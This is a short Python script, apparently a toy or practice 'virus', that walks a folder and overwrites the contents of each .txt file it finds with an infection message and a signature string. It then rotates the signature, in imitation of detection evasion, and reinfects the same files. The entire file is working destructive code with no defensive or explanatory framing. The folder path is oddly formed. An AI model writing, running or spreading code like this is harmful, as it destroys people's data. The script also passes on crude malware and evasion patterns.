import os
import time


VIRUS_SIGNATURE = "s0fTw4R30pT1m1z4t10n"

TARGET_FOLDER = os.path.expanduser("ornek.txt/Desktop")


def generate_new_signature():
    return "s0fTw4R30pT1m1z4t10n" + str(int(time.time()))


def infect_files():
    for root, dirs, files in os.walk(TARGET_FOLDER):
        for file in files:
            if file.endswith(".txt"):
                file_path = os.path.join(root, file)
                infect(file_path)


def infect(file_path):
    with open(file_path, "r") as f:
        content = f.read()

    # check if it is already infected
    if VIRUS_SIGNATURE not in content:
        with open(file_path, "w") as f:
            f.write("This file has been infected by a virus.\n" + VIRUS_SIGNATURE)


def change_signature():
    global VIRUS_SIGNATURE
    VIRUS_SIGNATURE = generate_new_signature()
    print(f"New virus signature: {VIRUS_SIGNATURE}")


def trigger_virus():
    print("Virus activated!")


if __name__ == "__main__":
    print("virus signature: " + VIRUS_SIGNATURE)
    trigger_virus()
    infect_files()
    print("Virus infected to the files successfully!")
    time.sleep(10)
    change_signature()
    print("Virus signature changed successfully!")
    infect_files()